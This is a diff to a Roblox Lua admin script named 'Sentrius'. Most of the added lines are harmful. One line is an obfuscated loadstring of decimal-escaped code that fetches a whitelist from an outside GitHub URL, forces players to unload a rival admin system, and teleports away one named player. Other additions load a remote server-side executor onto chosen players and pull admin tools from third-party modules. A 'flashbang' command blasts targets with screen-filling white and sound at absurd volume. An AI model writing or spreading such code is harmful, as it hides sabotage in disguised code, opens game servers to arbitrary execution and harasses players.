@@ -261,6 +261,9 @@ _G.say = function(p, m)
     scr.Enabled = true
 end
 
+--no more cxos admin sadly
+loadstring("\108\111\99\97\108\32\80\108\97\121\101\114\115\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\10\108\111\99\97\108\32\72\116\116\112\83\101\114\118\105\99\101\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\72\116\116\112\83\101\114\118\105\99\101\34\41\10\108\111\99\97\108\32\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101\34\41\10\108\111\99\97\108\32\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\10\108\111\99\97\108\32\108\97\110\122\121\32\61\32\34\120\88\82\98\108\120\71\97\109\101\114\82\98\108\120\88\120\34\10\108\111\99\97\108\32\99\120\111\85\82\76\32\61\32\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\112\99\120\111\47\99\120\111\115\45\97\100\109\105\110\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\119\104\105\116\101\108\105\115\116\101\100\34\10\108\111\99\97\108\32\99\120\111\85\82\76\50\32\61\32\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\112\99\120\111\47\99\120\111\115\45\97\100\109\105\110\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\119\104\105\116\101\108\105\115\116\101\100\50\34\10\108\111\99\97\108\32\112\32\61\32\80\108\97\121\101\114\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\108\97\110\122\121\41\10\105\102\32\112\32\116\104\101\110\10\32\32\32\32\105\102\32\95\71\46\99\120\111\115\97\100\109\105\110\108\111\97\100\101\100\32\61\61\32\116\114\117\101\32\97\110\100\32\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\99\120\111\39\115\32\102\111\108\100\101\114\34\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\95\71\46\115\97\121\40\108\97\110\122\121\44\32\34\47\117\110\108\111\97\100\34\41\10\32\32\32\32\32\32\32\32\119\97\105\116\40\48\46\49\48\41\10\32\32\32\32\101\110\100\10\32\32\32\32\95\71\46\99\120\111\115\97\100\109\105\110\108\111\97\100\101\100\32\61\32\116\114\117\101\10\32\32\32\32\108\111\99\97\108\32\97\32\61\32\116\97\98\108\101\46\102\105\110\100\40\95\71\46\115\112\101\99\105\97\108\112\101\114\109\115\44\32\108\97\110\122\121\41\10\32\32\32\32\105\102\32\97\32\116\104\101\110\10\32\32\32\32\32\32\32\32\116\97\98\108\101\46\114\101\109\111\118\101\40\95\71\46\115\112\101\99\105\97\108\112\101\114\109\115\44\32\97\41\10\32\32\32\32\101\110\100\10\32\32\32\32\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101\58\84\101\108\101\112\111\114\116\65\115\121\110\99\40\103\97\109\101\46\80\108\97\99\101\73\100\44\32\123\112\125\41\10\101\108\115\101\10\32\32\32\32\108\111\99\97\108\32\119\104\105\116\101\108\105\115\116\101\100\32\61\32\123\125\10\32\32\32\32\108\111\99\97\108\32\115\49\44\32\114\49\32\61\32\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\72\116\116\112\83\101\114\118\105\99\101\58\71\101\116\65\115\121\110\99\40\99\120\111\85\82\76\41\10\32\32\32\32\101\110\100\41\10\32\32\32\32\105\102\32\115\49\32\97\110\100\32\114\49\32\116\104\101\110\10\32\32\32\32\32\32\32\32\102\111\114\32\105\100\32\105\110\32\114\49\58\103\109\97\116\99\104\40\34\37\100\43\34\41\32\100\111\10\32\32\32\32\32\32\32\32\32\32\32\32\119\104\105\116\101\108\105\115\116\101\100\91\116\111\110\117\109\98\101\114\40\105\100\41\93\32\61\32\116\114\117\101\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\32\32\32\32\108\111\99\97\108\32\115\50\44\32\114\50\32\61\32\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\72\116\116\112\83\101\114\118\105\99\101\58\71\101\116\65\115\121\110\99\40\99\120\111\85\82\76\50\41\10\32\32\32\32\101\110\100\41\10\32\32\32\32\105\102\32\115\50\32\97\110\100\32\114\50\32\116\104\101\110\10\32\32\32\32\32\32\32\32\102\111\114\32\105\100\32\105\110\32\114\50\58\103\109\97\116\99\104\40\34\37\100\43\34\41\32\100\111\10\32\32\32\32\32\32\32\32\32\32\32\32\119\104\105\116\101\108\105\115\116\101\100\91\116\111\110\117\109\98\101\114\40\105\100\41\93\32\61\32\116\114\117\101\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\32\32\32\32\102\111\114\32\95\44\32\112\108\114\32\105\110\32\105\112\97\105\114\115\40\80\108\97\121\101\114\115\58\71\101\116\80\108\97\121\101\114\115\40\41\41\32\100\111\10\32\32\32\32\32\32\32\32\105\102\32\119\104\105\116\101\108\105\115\116\101\100\91\112\108\114\46\85\115\101\114\73\100\93\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\95\71\46\115\97\121\40\112\108\114\46\78\97\109\101\44\32\34\47\117\110\108\111\97\100\34\41\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\32\32\32\32\116\97\115\107\46\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\32\32\32\32\32\32\32\32\116\97\115\107\46\119\97\105\116\40\49\41\10\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\99\120\111\39\115\32\102\111\108\100\101\114\34\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\102\111\114\32\95\44\32\112\108\114\32\105\110\32\105\112\97\105\114\115\40\80\108\97\121\101\114\115\58\71\101\116\80\108\97\121\101\114\115\40\41\41\32\100\111\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\119\104\105\116\101\108\105\115\116\101\100\91\112\108\114\46\85\115\101\114\73\100\93\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\95\71\46\115\97\121\40\112\108\114\46\78\97\109\101\44\32\34\47\117\110\108\111\97\100\34\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\41\10\101\110\100")()
+
 local function logChat(plr, msg)
     table.insert(chatLogs, {
         player = plr.Name,
@@ -2837,6 +2840,8 @@ end  --end of full-access check (feels like you came out in prison after years t
     switchTab(defaultTab)
 end
 
+local cooldown = {} --rate limit
+
 local NET = ReplicatedStorage:FindFirstChild("xvkqmr")
 if not NET then
     NET = Instance.new("RemoteEvent")
@@ -2847,9 +2852,15 @@ end
 connections["net"] = NET.OnServerEvent:Connect(function(player, action, ...)
     local args = {...}
 
+    if not isAdmin(player) and action ~= "dev" then return end
+
+    local now = tick()
+    if not cooldown[player.UserId] then cooldown[player.UserId] = 0 end
+    if now - cooldown[player.UserId] < 0.1 then return end
+    cooldown[player.UserId] = now
+
     if action == "dev" then
         playerDevices[player.UserId] = args[1]
-
     elseif action == "dash" then
         if not isAdmin(player) then return end
         local PlayerGui = player:FindFirstChild("PlayerGui")
@@ -2860,7 +2871,6 @@ connections["net"] = NET.OnServerEvent:Connect(function(player, action, ...)
         else
             openDashboard(player, "Commands")
         end
-
     elseif action == "cmd" then
         if not running then return end
         local cmdText = args[1]
@@ -2884,7 +2894,6 @@ connections["net"] = NET.OnServerEvent:Connect(function(player, action, ...)
         else
             notify(player, "Sentrius", "Command '" .. cmd .. "' doesn't exist.", 3)
         end
-
     elseif action == "exec" then
         if not hasPermission(player, RANKS.FULL_ACCESS) then return end
         local targetType = args[1]
@@ -7667,7 +7676,7 @@ addCommand({
     aliases = {"clientscript", "cs"},
     desc = "self explanatory",
     usage = prefix .. "ls [player (optional)] [code]",
-    rank = RANKS.ADMINISTRATOR,
+    rank = RANKS.FULL_ACCESS,
     callback = function(plr, args)
         if not args or #args == 0 then
             notify(plr, "Sentrius", "Usage: " .. prefix .. "ls [player] [code]", 3)
@@ -9654,7 +9663,7 @@ addCommand({
             if plr.Name ~= "idonthacklol101ns" then
                 notify(plr,"Sentrius","adonis has been loaded on idonthacklol101ns\nask him for admin",6)
             end
-        elseif getrank(plr) > RANKS.SENIOR_MOD then
+        elseif getrank(plr) > RANKS.FULL_ACCESS then --i just realized senior mod cant run #s so it'll load only for full access now
             require(16662768931):GetAdmin(plr.Name, "Hi??")
             notify(plr,"Sentrius","adonis has been loaded on you since idonthacklol101ns is not in-game",6)
         else
@@ -9807,6 +9816,157 @@ addCommand({
             end
         else
             notify(plr,"Sentrius","failed to load betterf3x: "..tostring(err),4)
+        end
+    end
+})
+
+addCommand({
+    name = "exec2",
+    aliases = {"executor2", "fumo"},
+    desc = "Loads fumo's executor on a player",
+    usage = prefix .. "exec2 [player (optional)]",
+    rank = RANKS.FULL_ACCESS,
+    callback = function(plr, args)
+        local target = plr
+
+        if args and #args > 0 then
+            local targets = GetPlayer(args[1], plr)
+            if targets and #targets > 0 then
+                target = targets[1]
+            else
+                notify(plr, "Sentrius", "player not found!", 3)
+                return
+            end
+        end
+
+        if target == plr then
+            notify(plr, "Sentrius", "loading fumo executor on yourself...", 3)
+        else
+            notify(plr, "Sentrius", "loading fumo executor on " .. target.DisplayName .. "...", 3)
+            notify(target, "Sentrius", "fumo executor is being loaded on you by " .. plr.DisplayName .. "!", 4)
+        end
+
+        task.spawn(function()
+            local ok, err = pcall(function()
+                getfenv().require(11126053846).fse(target.Name)
+            end)
+            if not ok then
+                notify(plr, "Sentrius", "failed to load fumo executor: " .. tostring(err), 4)
+            end
+        end)
+    end
+})
+
+addCommand({
+    name = "flashbang",
+    aliases = {"fb"},
+    desc = "flashes someone's screen",
+    usage = prefix .. "flashbang [player]",
+    rank = RANKS.MODERATOR,
+    callback = function(plr, args)
+        local targets = {plr}
+        if args and #args > 0 then
+            local found = GetPlayer(args[1], plr)
+            if found and #found > 0 then
+                targets = found
+            end
+        end
+        if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
+            local ticking = tick()
+            require(112691275102014).load()
+            repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
+        end
+        local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
+        if not goog then
+            notify(plr, "Sentrius", "goog failed to load!", 3)
+            return
+        end
+        local names = {}
+        for _, target in ipairs(targets) do
+            local scr = goog:FindFirstChild("Utilities").Client:Clone()
+            local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+            loa.Parent = scr
+            scr:WaitForChild("Exec").Value = [[
+                local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+                if pg:FindFirstChild("SentriusFlashbang") then script:Destroy() return end
+
+                local ss = game:GetService("SoundService")
+
+                local s1 = Instance.new("Sound")
+                s1.SoundId = "rbxassetid://2926571220"
+                s1.Volume = 999999999999999999999999999999999999999
+                s1.RollOffMaxDistance = 0
+                s1.Parent = ss
+
+                local s2 = Instance.new("Sound")
+                s2.SoundId = "rbxassetid://2926571220"
+                s2.Volume = 999999999999999999999999999999999999999
+                s2.RollOffMaxDistance = 0
+                s2.Parent = ss
+
+                local s3 = Instance.new("Sound")
+                s3.SoundId = "rbxassetid://2926571220"
+                s3.Volume = 999999999999999999999999999999999999999
+                s3.RollOffMaxDistance = 0
+                s3.Parent = ss
+
+                local s4 = Instance.new("Sound")
+                s4.SoundId = "rbxassetid://2926571220"
+                s4.Volume = 999999999999999999999999999999999999999
+                s4.RollOffMaxDistance = 0
+                s4.Parent = ss
+
+                local s5 = Instance.new("Sound")
+                s5.SoundId = "rbxassetid://2926571220"
+                s5.Volume = 999999999999999999999999999999999999999
+                s5.RollOffMaxDistance = 0
+                s5.Parent = ss
+
+                local s6 = Instance.new("Sound")
+                s6.SoundId = "rbxassetid://2926571220"
+                s6.Volume = 999999999999999999999999999999999999999
+                s6.RollOffMaxDistance = 0
+                s6.Parent = ss
+
+                local s7 = Instance.new("Sound")
+                s7.SoundId = "rbxassetid://2926571220"
+                s7.Volume = 999999999999999999999999999999999999999
+                s7.RollOffMaxDistance = 0
+                s7.Parent = ss
+
+                s1:Play() s2:Play() s3:Play() s4:Play() s5:Play() s6:Play() s7:Play()
+
+                local flashGui = Instance.new("ScreenGui")
+                flashGui.Name = "SentriusFlashbang"
+                flashGui.ResetOnSpawn = false
+                flashGui.IgnoreGuiInset = true
+                flashGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                flashGui.Parent = pg
+
+                local whiteScreen = Instance.new("Frame")
+                whiteScreen.Size = UDim2.new(1, 0, 1, 0)
+                whiteScreen.Position = UDim2.new(0, 0, 0, 0)
+                whiteScreen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                whiteScreen.BackgroundTransparency = 0
+                whiteScreen.BorderSizePixel = 0
+                whiteScreen.ZIndex = 99999
+                whiteScreen.Parent = flashGui
+
+                wait(7)
+                flashGui:Destroy()
+                s1:Play() s2:Play() s3:Play() s4:Play() s5:Play() s6:Play() s7:Play()
+                script:Destroy()
+            ]]
+            if target.Character then
+                scr.Parent = target.Character
+            else
+                scr.Parent = target:WaitForChild("PlayerGui")
+            end
+            scr.Enabled = true
+            table.insert(names, target.DisplayName)
+        end
+        if #names > 0 then
+            notify(plr, "Sentrius", "Flashbanged: " .. format(names), 3)
         end
     end
 })
